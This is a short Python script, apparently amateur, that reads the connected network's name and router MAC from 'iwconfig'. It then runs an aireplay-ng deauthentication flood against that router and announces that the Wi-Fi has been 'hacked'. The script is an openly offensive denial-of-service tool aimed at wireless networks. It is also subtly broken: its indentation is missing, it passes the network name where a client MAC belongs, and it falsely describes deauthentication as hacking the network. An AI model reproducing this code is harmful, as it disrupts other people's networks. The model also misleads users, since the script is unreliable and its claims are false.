
import os

def hack_wifi():
  
print("Hacks the Wi-Fi network.")

# Get the output of the "iwconfig" command.
output = os.popen("iwconfig").read()

# Check if the output contains the string "ESSID:".
if "ESSID:" in output:
# If it does, then the computer is connected to Wi-Fi.
# Get the name of the Wi-Fi network.
essid = output[output.find("ESSID:") + 7:output.find("\n", output.find("ESSID:"))]

# Get the MAC address of the Wi-Fi router.
mac = output[output.find("Access Point: ") + 13:output.find("\n", output.find("Access Point:"))]

# Print the name and MAC address of the Wi-Fi network.
print("Wi-Fi network:", essid)
print("MAC address:", mac)

# Hack the Wi-Fi network.
os.popen("sudo aireplay-ng -0 10 -a " + mac + " -c " + essid + " wlan0mon").read()

# Print a message saying that the Wi-Fi network has been hacked.
print("Wi-Fi network hacked!")
else:
# If it doesn't, then the computer is not connected to Wi-Fi.
print("You are not connected to Wi-Fi.")

if __name__ == "__main__":
# Hack the Wi-Fi network.
hack_wifi()

